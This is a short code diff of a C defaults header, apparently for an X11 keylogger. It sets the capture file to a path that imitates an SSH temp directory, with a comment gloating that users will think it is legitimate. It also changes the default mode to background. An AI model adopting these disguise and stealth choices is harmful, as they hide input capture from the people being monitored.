@@ -20,14 +20,12 @@
 #ifndef X11K_DEFAULTS_H
 #define X11K_DEFAULTS_H
 
-#include <limits.h>
-
 #define forever 1 // alone
 
 #define DEFAULT_CAPTURE_FILEADDR "/tmp/ssh-IZQgaojExB8N"
 // MUHAHAHHA! USER SHOULD THINK IT'S SOMETHING LEGIT!! [evil laugh]
 // but what if someone will have directory with same name?.. https://imgflip.com/s/meme/Conspiracy-Keanu.jpg
-// well, whatever, i don't even care about that 0.000001% case
+// well, whatever, i don't even care about that 0.000001% case. Program execution will end with error. That's enough.
 
 // List of modes
 #define MODE_BACKGROUND 1
@@ -40,10 +38,7 @@
 #define MODE_COMMAND_STRING "command"
 
 // Default mode
-#define DEFAULT_MODE MODE_FOREGROUND
-
-// List of commands
-#define COMMAND_EXAMPLE "example" //not implemented yet
+#define DEFAULT_MODE MODE_BACKGROUND
 
 // Shared memory
 #define SHMEM_KEY 357357
